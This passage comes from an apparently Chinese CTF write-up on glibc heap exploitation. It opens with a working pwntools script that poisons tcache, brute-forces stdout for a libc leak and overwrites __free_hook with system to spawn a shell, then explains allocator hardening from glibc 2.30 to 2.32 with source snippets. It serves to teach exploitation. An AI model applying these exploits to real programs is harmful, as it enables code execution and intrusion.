class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>当然这种解法有点没效率，因为需要同时爆破Libc和heap的各半个字节，总共一个字节，总的来说数学期望为1/256。但是观察上面我们可以看到由于tcache机制，同处于0x100一个内存页下的Chunk前面的都一样，不用爆破，那么只需要修改最后一个字节即可完成tcache链表的修改，这样爆破的期望就下降到了半个字节，数学期望1/16，明显提升了很大效率</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"> </span><br><span class="line"><span class="function">def <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function">    global p</span></span><br><span class="line"><span class="function">    heap_base </span>= leak_heap()</span><br><span class="line">    libc_base = leak_libc() - libc.sym['printf']</span><br><span class="line">    elf_base = leak_elf() - elf.sym['main']</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">"heap_base:0x%x"</span>%heap_base)</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">"libc_base:0x%x"</span>%libc_base)</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">"elf_base:0x%x"</span>%elf_base)</span><br><span class="line">    add_malloc(0x1000-0x8-0x250,'PIG007NB')</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    guess_libc = <span class="number">0xd000</span></span><br><span class="line">    guess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']</span><br><span class="line">    lg(<span class="string">"guess_IO"</span>,guess_IO)</span><br><span class="line"> </span><br><span class="line">    tcacheMalloc(<span class="number">0x98</span>)         <span class="meta">#idx 0x1~0x7</span></span><br><span class="line">    add_malloc(<span class="number">0x98</span>,<span class="string">"\x00"</span>*<span class="number">0x98</span>)                <span class="meta">#idx    0x8</span></span><br><span class="line"> </span><br><span class="line">    add_malloc(<span class="number">0x98</span>,<span class="string">"\x00"</span>*<span class="number">0x98</span>)                <span class="meta">#idx    0x9</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x01"</span>*<span class="number">0x38</span>)                <span class="meta">#idx    0xa</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x02"</span>*<span class="number">0x38</span>)                <span class="meta">#idx    0xb</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x03"</span>*<span class="number">0x38</span>)                <span class="meta">#idx    0xc</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x04'</span>*<span class="number">0x38</span>)                <span class="meta">#idx    0xd</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="meta">#write libc addr</span></span><br><span class="line">    tcacheDelete(<span class="number">0x1</span>)</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0x9</span>)</span><br><span class="line">    add_malloc(<span class="number">0x38</span>,p16((guess_IO)&amp;<span class="number">0xffff</span>))                <span class="meta">#idx     0xe</span></span><br><span class="line">    <span class="meta">#show(0x1)</span></span><br><span class="line">    #libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])</span><br><span class="line">    <span class="meta">#lg(<span class="meta-string">"libc_base_attempt"</span>,libc_base_attempt)</span></span><br><span class="line"> </span><br><span class="line">    <span class="meta">#change 0x40 link_list</span></span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0xa</span>)</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0xc</span>)</span><br><span class="line">    edit(<span class="number">0xc</span>,<span class="number">0x1</span>,<span class="string">'\x10'</span>)</span><br><span class="line"> </span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x05'</span>*<span class="number">0x38</span>)                        <span class="meta">#idx    0xf</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x06'</span>*<span class="number">0x38</span>)                        <span class="meta">#idx    0x10</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)<span class="meta">#idx    0x11</span></span><br><span class="line"> </span><br><span class="line">    libc_base = u64Leakbase(<span class="number">0x3b5890</span>)</span><br><span class="line">    lg(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    add_malloc(0x48,'/bin/sh\x00')                        #idx    0x12</span><br><span class="line">    add_malloc(0x48,'/bin/sh\x00')                        #idx    0x13</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0x12</span>)</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0x13</span>)</span><br><span class="line">    edit(0x13,0x8,p64(libc_base+libc.sym['__free_hook']))</span><br><span class="line"> </span><br><span class="line">    add_malloc(0x48,'/bin/sh\x00')                        #idx    0x14</span><br><span class="line">    add_malloc(0x48,p64(libc_base + libc.sym['system']))#idx     0x15</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0x14</span>)</span><br><span class="line">    it()</span><br><span class="line"> </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = <span class="built_in">process</span>(<span class="string">"./note"</span>)</span><br><span class="line">        lg(<span class="string">"Times:"</span>,i)</span><br><span class="line">        pwn()</span><br><span class="line">    except EOFError:</span><br><span class="line">        p.<span class="built_in">close</span>()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    except Exception:</span><br><span class="line">        p.<span class="built_in">close</span>()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>▲爆破题外话：之前没怎么发现，这里发现PIE+ASLR出来的Libc地址开头可能是0x7e，而且中间也有可能会出现\x00的情况，这样就很容易使得我们爆破的次数直线上涨，所以在调试好了之后，爆破会加入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"> </span><br><span class="line">context.timeout = <span class="number">0.5</span></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>来简单对抗这两种变化，防止爆破中断。</p>
<h5 id="4-UAF-无Leak-Size做限制-1"><a href="#4-UAF-无Leak-Size做限制-1" class="headerlink" title="(4)UAF+无Leak+Size做限制:"></a>(4)UAF+无Leak+Size做限制:</h5><p>一般很多tcache的题都会对size做限制，要么小，要么大。但是其实对于tcache的UAF来说，没啥大用，都能绕过，不像fastbin一样，需要在目的地址伪造size。所以这里基本上修改一下size都可以得到对应解法，这种题目更多应该是考察堆布局的能力。需要有一个对于所有chunk进行布局的能力，最好准备草稿纸写写画画(excel也行)…..</p>
<h3 id="四、Glibc2-31"><a href="#四、Glibc2-31" class="headerlink" title="四、Glibc2.31"></a>四、Glibc2.31</h3><h4 id="1-部分手段失效-1"><a href="#1-部分手段失效-1" class="headerlink" title="1.部分手段失效"></a>1.部分手段失效</h4><h5 id="1-原始largebin-attack失效"><a href="#1-原始largebin-attack失效" class="headerlink" title="(1)原始largebin attack失效"></a>(1)原始largebin attack失效</h5><p>从2.30开始将从unsortebin放入largebin的代码中在size比较的其中一个分支新增检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//unsortedbin chunk-&gt;size &lt; largebin chunk-&gt;size</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//unsortedbin chunk-&gt;size &gt;= largebin chunk-&gt;size</span></span><br><span class="line">&#123;</span><br><span class="line">    assert (chunk_main_arena (fwd));</span><br><span class="line">    <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; chunksize_nomask (fwd))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span>== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">    <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (nextsize)"</span>);</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即当发生从unsortedbin中转移到largbin中时，如果unsortedbin中要转移的chunk的size大于largebin中原本就有的尾部chunk的size，就会触发新增的检查。否则，则不会触发新增的检查。</p>
<p>而新增检查的意思其实就是检查双向链表的完整性，这和之前unsortedbin失效加入的检查如出一辙。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (nextsize)"</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br></pre></td></tr></table></figure>

<p>但是由于当size小于的时候没有检查，所以largebin attack还是可以用的，只要unsortedbin中要放入largebin中的chunk的size小于largebin中chunk的size即可，但是这里的largebin attack已经被降级，相比之前的两个地址任意写，限制只能写一个地址了。</p>
<h5 id="2-Tcache结构扩大"><a href="#2-Tcache结构扩大" class="headerlink" title="(2)Tcache结构扩大"></a>(2)Tcache结构扩大</h5><p>之前版本的tcache中count一直是一个字节，这回从2.30开始就变成了两个字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.29</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.30</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p>所以tcache的结构体也从0x250扩大为0x290</p>
<h5 id="3-删除了一些assert"><a href="#3-删除了一些assert" class="headerlink" title="(3)删除了一些assert"></a>(3)删除了一些assert</h5><p>在2.30版本及之后，删除了一些有关tcache的assert</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.29</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"> </span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.30</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"> </span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.29</span></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.30</span></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以前就想着是不是能像控fastbinY溢出一样来控tcache溢出呢，但在2.29及以前肯定是不行的，因为有assert存在。就算修改了mp_.tcache_bins，成功进入tcache_put也会因为assert(tc_idx&lt;TCACHE_MAX_BINS)的断言使得程序退出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">           &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = tc_victim-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是新版本删去了这个操作，那么如果我们能够修改mp_.tcache_bins，就将能够调用tcache_put函数，将tcache结构体往后溢出，就像修改global_max_fast一样，实在是有点逗，不知道为什么新版本要删掉，这个就引入了一种新的方法：<a href="https://www.anquanke.com/post/id/235821" target="_blank" rel="noopener">glibc 2.27-2.32版本下Tcache Struct的溢出利用 - 安全客，安全资讯平台 (anquanke.com)</a>。这个我个人还是觉得这位师傅讲的还是有点出入，因为是2.30才删去的，2.29及以前是不存在这种方法的，包括用2.29调试也是的。</p>
<h5 id="4-对count新增了一些限制"><a href="#4-对count新增了一些限制" class="headerlink" title="(4)对count新增了一些限制"></a>(4)对count新增了一些限制</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.29</span></span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.30</span></span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从2.30开始在<code>_libc_malloc</code>中准备从tcache中申请时，会判断<code>counts[tc_idx]</code>是否大于0，不大于0则不会从tcache中申请。所以有时候我们使用直接修改fd的办法需要考虑到数量是否会被清0。但是在<code>_int_free</code>中却没有新增类似的检查。</p>
<h4 id="2-UAF常见限制-1"><a href="#2-UAF常见限制-1" class="headerlink" title="2.UAF常见限制"></a>2.UAF常见限制</h4><h5 id="1-UAF-Leak-Size不做限制"><a href="#1-UAF-Leak-Size不做限制" class="headerlink" title="(1)UAF+Leak+Size不做限制:"></a>(1)UAF+Leak+Size不做限制:</h5><p>这里也不需要多讲，放入unsortedbin后直接泄露地址之后任意申请就完了。</p>
<h5 id="2-UAF-Leak-Size做限制-1"><a href="#2-UAF-Leak-Size做限制-1" class="headerlink" title="(2)UAF+Leak+Size做限制:"></a>(2)UAF+Leak+Size做限制:</h5><p>结合之前的，小Chunk就修改size，可以放入unsortedbin的就填满Tcache之后放入泄露地址后任意申请即可。</p>
<h5 id="3-UAF-无Leak-Size不做限制-2"><a href="#3-UAF-无Leak-Size不做限制-2" class="headerlink" title="(3)UAF+无Leak+Size不做限制:"></a>(3)UAF+无Leak+Size不做限制:</h5><p>其实和2.29差不多，只是失效了一些手段，比如传统的largebin attack失效。而之前在2.29中讲到的相关方法其实也一样可以直接用上。爆破_IO_2_1_stdout泄露地址，之后任意申请修改__free_hook即可。</p>
<h5 id="4-UAF-无Leak-Size做限制-2"><a href="#4-UAF-无Leak-Size做限制-2" class="headerlink" title="(4)UAF+无Leak+Size做限制:"></a>(4)UAF+无Leak+Size做限制:</h5><p>同样还是需要通过堆布局来修改size，制造unsortedbin chunk。</p>
<h3 id="五、Glibc2-32"><a href="#五、Glibc2-32" class="headerlink" title="五、Glibc2.32"></a>五、Glibc2.32</h3><h4 id="1-新增机制"><a href="#1-新增机制" class="headerlink" title="1.新增机制"></a>1.新增机制</h4><h5 id="1-Tcache和Fastbin新增指针异或检查的safe-linking机制"><a href="#1-Tcache和Fastbin新增指针异或检查的safe-linking机制" class="headerlink" title="(1)Tcache和Fastbin新增指针异或检查的safe-linking机制"></a>(1)Tcache和Fastbin新增指针异或检查的safe-linking机制</h5><p>①引入一个宏定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>②实际应用</p>
<p>Tcache中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache;</span><br><span class="line"> </span><br><span class="line">    e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br><span class="line">    tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">    e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">    <span 